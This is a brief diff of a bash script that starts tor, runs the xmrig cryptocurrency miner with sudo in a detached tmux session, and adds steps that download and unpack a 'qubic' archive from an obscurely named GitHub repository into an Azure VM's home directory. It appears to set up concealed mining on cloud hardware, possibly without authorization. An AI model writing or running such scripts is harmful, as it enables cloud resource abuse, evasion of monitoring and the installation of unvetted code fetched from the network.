@@ -1,3 +1,6 @@
 #!/bin/bash
 sudo systemctl start tor
 tmux new -ds servak sudo ./xmrig
+cd home/azureuser
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/qubic.tar.gz -P /home/azureuser
+tar -xf qubic.tar.gz
